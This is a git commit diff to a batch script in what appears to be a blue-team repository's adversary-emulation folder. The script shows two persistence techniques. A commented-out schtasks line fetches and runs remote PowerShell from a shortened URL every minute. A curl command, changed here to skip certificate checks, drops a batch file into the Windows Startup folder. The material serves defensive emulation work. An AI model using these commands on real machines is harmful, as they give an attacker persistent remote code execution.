f55bab13f2c2ee57b57cf42b2ce98f9cb7a0ec87
ZeroDayZealot <95112988+LeMagicKonch@users.noreply.github.com>
2025-09-29 10:59:51 -0400

    Update taskSchedular.bat

--- Adversary Emulation/taskSchedular.bat
+++ Adversary Emulation/taskSchedular.bat
@@ -3,4 +3,5 @@
 :: schtasks /CREATE /SC MINUTE /TN updater /TR "powershell.exe -c iex (iwr -uri 'https://tinyurl.com/yfddd2zp' -UseBasicParsing).Content"
 
 
-curl.exe -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startupPersistance.bat" "https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/startCalc.bat"
+curl.exe -k -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startupPersistance.bat" "https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/startCalc.bat"
+
